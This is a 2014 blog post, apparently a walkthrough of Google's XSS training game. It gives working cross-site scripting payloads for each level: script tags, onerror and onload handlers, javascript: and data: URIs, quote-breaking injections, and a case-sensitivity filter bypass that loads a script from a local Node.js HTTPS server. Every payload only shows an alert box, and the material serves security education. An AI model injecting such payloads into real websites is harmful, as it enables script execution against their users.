@@ -1,0 +1,335 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Diving into XSS Google's Game - My portfolio</title>
+  <meta name="author" content="Paul A. (PaulSec)">
+
+  
+  <meta name="description" content="Hi there, this post deals with the game released by Google few days ago about XSS vulnerabilities. I&rsquo;ll enumerate some of the solution I found &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://paulsec.github.io/blog/2014/06/02/diving-into-xss-googles-game">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My portfolio" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href='http://fonts.googleapis.com/css?family=Quattrocento+Sans|Roboto:400,300' rel='stylesheet' type='text/css'>
+
+  
+
+</head>
+
+
+<body>
+	<div class="container">
+		<aside class="left">
+			<div class="inner-left">
+				<header>
+					
+  <img src="http://www.gravatar.com/avatar/0b0f4cb32c81edd3e8dca37bde08910c?s=200" alt="Gravatar of Paul A. (PaulSec) " title="Gravatar of Paul A. (PaulSec)" class="profilepic" />
+
+<hgroup>
+  <h1><a href="/">My portfolio</a></h1>
+  
+    <h2 class="subtitle">Blog of a (Web) Security enthusiast.</h2>
+   
+</hgroup>
+
+
+				</header>
+				<footer>
+					<p>
+	
+	
+</p>
+				</footer>
+			</div>
+		</aside>
+    	<section class="right">
+    		<div class="inner-right">
+    			<div id="posts">
+    			  	<article class="post">
+    
+  <header>
+    
+      <h1 class="entry-title">Diving Into XSS Google's Game</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-06-02T19:34:12+02:00" pubdate data-updated="true">Jun 2<span>nd</span>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Hi there, this post deals with the game released by Google few days ago about XSS vulnerabilities.</p>
+
+<p>I&rsquo;ll enumerate some of the solution I found on the Internet which were (in my opnion) interesting/fun.
+This post contains the solutions for all levels. <strong>Big spoil.</strong></p>
+
+<h2>Level 1: Hello, world of XSS</h2>
+
+<p>Well, this one was obvious:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 2: Persistence is key</h2>
+
+<p>For this one, you had different options:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">&quot;test&quot;</span> <span class="na">onclick=</span><span class="s">&quot;javascript:alert(1);&quot;</span><span class="nt">&gt;</span>test<span class="nt">&lt;/a&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Creating a link (will need an interation with the user)</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;test.png&quot;</span> <span class="na">onerror=</span><span class="s">&quot;javascript:alert(1);&quot;</span> <span class="nt">/&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Loading an invalid image (using onerror) &ndash; no interation</em></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">&quot;https://xss-game.appspot.com/static/level2_icon.png&quot;</span> <span class="na">onload=</span><span class="s">&quot;alert(1);&quot;</span> <span class="nt">/&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Loading a valid image (using onload) &ndash; no interation</em></p>
+
+<h2>Level 3: That sinking feeling&hellip;</h2>
+
+<p>The image loaded on the page uses the <code>window.location.hash</code> javascript property.</p>
+
+<p>We can abuse it this way:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="p">.</span><span class="nx">jpg</span><span class="s1">&#39; onload=&#39;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="err">&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Loading a valid image (using onload) &ndash; no interation</em></p>
+
+<p>And also:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="err">&#39;</span> <span class="nx">onerror</span><span class="o">=</span><span class="s2">&quot;alert(1)&quot;</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Loading an invalid image (using onerror) &ndash; no interation</em></p>
+
+<p>It was also possible to use the <code>script</code> tag like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="err">&#39;</span><span class="o">&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 4: Context matters</h2>
+
+<p>To do this one there were different approaches:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="s1">&#39;)%3Balert(&#39;</span><span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The semicolon character had to be encoded because otherwise it was escaped.</p>
+
+<p>It was possible to escape <code>'</code> (single-quote character) too.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">3</span><span class="nx">balert</span><span class="p">(</span><span class="o">%</span><span class="mi">271</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It was also possible to use <code>||</code> logical operator.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="s1">&#39;) || alert(&#39;</span><span class="mi">1</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It was also possible to do it without any encoding/operator this way:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="mi">1</span><span class="err">&#39;</span><span class="p">);</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="c1">//</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Level 5: Breaking protocol</h2>
+
+<p>For this one, characters such as <code>"</code> (double-quote) was escaped.</p>
+
+<p>We could just use:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, after clicking on the link, we popped up the alert box.</p>
+
+<h2>Level 6: Follow the rabbit</h2>
+
+<p>For the last level, it was possible to use <code>data:text/javascript</code> this way:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">data</span><span class="o">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">javascript</span><span class="p">,</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The regex was also case sensitive, so.. instead of &ldquo;http&rdquo;, we could write it &ldquo;HTTP&rdquo;.
+Then, we were able to load remote scripts this way:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">HTTP</span><span class="o">:</span><span class="c1">//127.0.0.1:8000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>or adding a whitespace at the beginning:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="nx">http</span><span class="o">:</span><span class="c1">//127.0.0.1:8000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>the index page only had to contain some javascript like: <code>alert(1);</code>.</p>
+
+<p>I saw on the internet that some people didn&rsquo;t manage to load some HTTP scripts because the game is only in HTTPS.
+You can create a simple HTTPS Server (using Node.js for example).</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">https</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;https&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">hskey</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;server.key&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">hscert</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;server.crt&#39;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">var</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">key</span><span class="o">:</span> <span class="nx">hskey</span><span class="p">,</span>
+</span><span class='line'>    <span class="nx">cert</span><span class="o">:</span> <span class="nx">hscert</span>
+</span><span class='line'><span class="p">};</span>
+</span><span class='line'>
+</span><span class='line'><span class="nx">https</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>    <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">);</span>
+</span><span class='line'>    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s2">&quot;alert(1);&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">8000</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><em>Simple HTTPS Server using Node.js</em></p>
+
+<p>If you run a HTTPS Server, just add this as a payload:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="c1">//127.0.0.1:8000</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>//</code> is another way to say <code>https</code>.</p>
+
+<p>Hope you learnt at least one trick.
+This game was really fun. Waiting for the next one.</p>
+</div>
+
+
+</article>
+
+
+        <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://paulsec.github.io/blog/2014/06/02/diving-into-xss-googles-game/" data-via="" data-counturl="http://paulsec.github.io/blog/2014/06/02/diving-into-xss-googles-game/" >Tweet</a>
+  
+  
+  
+</div>
+
+
+
+
+
+    			</div>
+    			<footer id="footer">
+    				<p class="credit">
+  Copyright &copy; 2014 - Paul A. (PaulSec). Powered by <a href="http://octopress.org">Octopress</a>
+</p>
+
+
+    			</footer>
+    			
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+<link href='http://fonts.googleapis.com/css?family=Quattrocento+Sans|Roboto:400,300' rel='stylesheet' type='text/css'>
+
+
+
+
+
+    		</div>
+    	</section>
+  	</div>
+</body>
+</html>
